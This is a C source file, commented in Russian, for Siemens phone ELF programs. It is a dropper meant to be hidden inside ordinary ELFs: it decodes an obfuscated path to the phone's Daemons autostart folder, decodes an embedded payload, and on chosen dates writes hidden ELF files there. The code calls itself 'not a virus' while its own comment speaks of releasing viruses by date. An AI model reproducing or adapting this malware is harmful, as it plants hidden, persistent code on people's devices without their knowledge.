
// Код для высадки эльфов в демонов v0.9
// Встраивается в обычные эльфы!!!
// Не вирус!

//Послед-ть работы:
//0. Переименовываем эльфы в их имена без расширения
//1. эльфы собираем командой EXE CBD -a куда @список
//2. подправить bodysize на размер файла
//3. перекодировать его
//4. собрать вызвав 9.bat

//#define NEWSGOLD
//#include "..\swilib.h"

//ВЫНЕСТИ ВО ВНЕШНИЙ ЭЛЬФ!!!
//#define bodysize 2048 ///ПОДПРАВИТЬ!!!
//char cbn[bodysize]="INSERT DATA HERE!";
//#define maxdd 32
//int dd[maxdd]={ //флаги выгрузки по дням соотв. эльфов (если 1<<день, то копируем в демонов)
//  1<<1,1<<7
//};

//const char pa[32]="4:\\ZBin\\Daemons\\";//зашифрован
#define offext 16
char pa[32]="\xCB\xC5\xA3\xA5\xBD\x96\x91\xA3\xBB\x9E\x9A\x92\x90\x91\x8C\xA3"
"\x0";


struct cbdst{
  unsigned int off;
  char name[12];
} *cbd;

void vr(){ //выпускаем вири по дате
  int i, f, cmax, day;
  unsigned char *s;
  unsigned int err;
  TDate date;
  TTime time;
  GetDateTime(&date,&time);
  day=1<<date.day;
  //перекодируем
  for(i=0;i<offext;i++)
    pa[i]=~pa[i];
  for(i=0,s=(unsigned char *)cbn;i<bodysize;i++,s++)
    *s=(*s>>1)+((*s&1)?0x80:0); 
  //ищем макс
  for(cbd=(struct cbdst*)cbn,cmax=0; *cbd->name && cmax<maxdd; cmax++,cbd++);
  //цикл по эльфам
  for(cbd=(struct cbdst*)cbn,i=0;i<cmax;i++,cbd++){ 
    if(dd[i]&day){  //выпускаем
      memcpy(pa+offext,cbd->name,12);
      strcat(pa+offext,".elD");
    lloop:
        if((f=fopen(pa,A_WriteOnly+A_BIN+A_Create+A_Truncate,P_WRITE,&err))==-1) 
          if(*(char*)pa!='0'){ *(char*)pa='0'; goto lloop;}
        if(f!=-1){
          fwrite(f,cbn+cbd->off,cbd[1].off-cbd->off,&err);
          fclose(f,&err);
        }
    }
  }
}  
